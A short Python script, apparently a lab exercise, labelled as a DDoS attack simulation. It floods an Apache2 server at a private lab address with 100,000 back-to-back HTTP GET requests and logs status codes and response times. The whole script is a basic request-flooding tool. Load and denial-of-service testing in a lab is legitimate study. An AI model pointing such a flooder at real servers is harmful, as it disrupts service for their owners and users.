import requests  # for posting  HTTP requests this library requires ( Manual installation required via pip)
import time     # for adding delays this library requires 

def send_request(url, client_id):
    # Send a request to apache2 server
    # This function simulates an IoT device sending data to a apache2 server

    try:
        # Start counting  time before posting the request to apache2 endpoint 
        start_time = time.time()
        
        #  Posting http request to get response  from apache2 server
        # This URL should be the endpoint where the IoT device sends data
        response = requests.get(url)
        
        # End time after receiving response from apache2 server
        end_time = time.time()
        
        # Calculate response time from apache2 server in milliseconds
        response_time = (end_time - start_time) * 1000
    
        print(f"[Client {client_id}] Status Code: {response.status_code}, Response Time: {response_time:.2f}ms") # status code, client ID and response time printing
        
    except requests.exceptions.RequestException as e:
        # Logging error when apache 2 server  fails to process the request
        print(f"[Client {client_id}] Error: {e}") # Printing error message with client ID


# # Test server URL where apache2 is running on KALI Linux
SERVER_URL = 'http://192.168.65.2/'  

# DDOS attack simulation by flooding 100000 requests to apache2 server without delay 
NUM_REQUESTS = 100000                
DELAY = 0                       

# The loop counts from 1 to 100,000 without any delay between requests
for request_id in range(1, NUM_REQUESTS + 1):
    send_request(SERVER_URL, request_id)
    # delay between the http requests. in this case no delay since DELAY is set to 0
    time.sleep(DELAY)  


"""
References:

HTTP Requests: https://requests.readthedocs.io/en/latest/user/quickstart/#make-a-request 
Time Delay:    https://docs.python.org/3/library/time.html
Sending HTTP Requests: https://realpython.com/python-requests/
Function define: https://docs.python.org/3/tutorial/controlflow.html#defining-functions
Error Handling: https://requests.readthedocs.io/en/latest/user/quickstart/#errors-and-exceptions
Constants used foe Server URL: https://peps.python.org/pep-0008/#constants
integer declaration for simulatng IOT devices : https://docs.python.org/3/reference/lexical_analysis.html#integer-literals
Forloop with range function: https://docs.python.org/3/tutorial/controlflow.html#for-statements
Time delay for legitimate requests: https://docs.python.org/3/library/time.html#time.sleep
"""